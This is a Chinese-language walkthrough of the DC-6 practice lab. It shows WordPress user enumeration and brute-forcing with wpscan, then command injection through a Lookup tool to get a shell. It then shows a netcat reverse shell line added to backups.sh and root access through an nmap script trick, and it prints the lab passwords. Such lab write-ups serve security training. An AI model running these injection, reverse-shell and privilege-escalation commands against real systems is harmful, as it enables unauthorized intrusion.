---
title: DC6
date: 2023-09-03T15:29:52+08:00
updated: 2023-07-17T21:23:18+08:00
categories: 
- 渗透测试
- 靶机练习
---

```
arp-scan -l
==>
192.168.121.150
```

扫描目标端口![nmap](E:\笔记软件\笔记\渗透测试\靶机练习\DC6图库\nmap.png)

访问80端口看看有什么功能，又遇到了IP和域名问题，修改一下host文件即可解决,过于明显的特征，很显然是一个wordpress网站，利用具有针对性的工具进行扫描，先使用wpscan简单探测一下![wpsan-1](E:\笔记软件\笔记\渗透测试\靶机练习\DC6图库\wpsan-1.png)

可以看到wordpress的版本为5.1.1,既然是wordpress，后台就应该存在登录界面，这里同样是一个没有验证码的登录框/wp-login.php

以防万一我们还是先跑个目录，防止有别的信息泄露什么的，除了一个includes就没别的有用信息了，效仿上一次wordpress的攻击，

我们先采取密码爆破的形式，先扫描谁注册了该站点

```
wpscan --url http://wordy/ -e
```

能够得到以下用户名

![useranme](E:\笔记软件\笔记\渗透测试\靶机练习\DC6图库\useranme.png)

用这些用户名制作一个字典，先试试cewl爬取的字典能不能成功

```
wpscan --url http://wordy/login.php --usernames username.txt --passwords password.txt
```

结果并不理想，失败了，换成使用rockyou,字典要跑完需要花很长的时间，这里采用取巧一点的办法，直接看WP出来的密码，也是利用w上述方法进行爆破，这里就不等了

```
mark ==> helpdesk01
```

我这里没有直接登录，尝试一下这个账号能不能直接连ssh,连接失败了就登陆看看后台，后台没有什么可用信息，但是有一个Tools界面是空白的，这显然不太寻常，查看一圈，发现tools的利用点是在activity页面，抓包看看利用逻辑，有一个Lookup工具，或许可以用这个拿到反向shell![yools](E:\笔记软件\笔记\渗透测试\靶机练习\DC6图库\yools.png)

逻辑很简单，将lookup和ip拼接在一起执行命令，我们可以用过||的形式拼接执行第二条命令，反弹一个shell,接着用python起交互

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

![shell1](E:\笔记软件\笔记\渗透测试\靶机练习\DC6图库\shell1.png)

使用sudo命令需要密码，查一下有没有可以以root权限执行的命令，mount只能使用sudo提权，查看一下系统信息

uname -a 

```
Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 GNU/Linux
```

内核版本为4.9.0-8-amd64，在home目录下找到用户文件夹，经过翻找在mark的目录下找到了graham的密码

```
GSo7isUM1D4
```

ssh连接一下，可以成功连接

backups.sh的脚本是解压这个backups的压缩包到/var/www/html下，当前目录下没有，应该是要执行这个脚本生成后门

sudo -l查看当前用户能执行的脚本，发现是能无密码执行该脚本的，在执行过程中tar命令出现问题，看了看wp，原来可以利用jens用户来执行该脚本反弹jens的shell,在脚本中添加

```
nc -e /bin/bash 192.168.121.135 4444 
然后执行
sudo -u jens ./backups.sh
```

监听即可拿到shell

![jens](E:\笔记软件\笔记\渗透测试\靶机练习\DC6图库\jens.png)

再用python起交互式，再次寻找能利用的提权点

```
sudo -l
```

这次能够无密码利用nmap,那就使用nmap进行提权,先查看一下nmap版本为7.4,根据版本选择提权命令

```
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

执行上述三条命令，即可获得rootshell

![rootshell](E:\笔记软件\笔记\渗透测试\靶机练习\DC6图库\rootshell.png)

最后进root目录拿flag即可

![flag](E:\笔记软件\笔记\渗透测试\靶机练习\DC6图库\flag.png)

## 总结：

靶机基于wordpress，前期工作还算比较顺利，但是拿到第一个用户的shell之后就想着直接提权，这样不一定可取，还是得先去收集靶机上的信息，特别是在后后门的情况下，并且能够利用的点要筛查完，每个用户对应着什么权限都应该拿出来看看
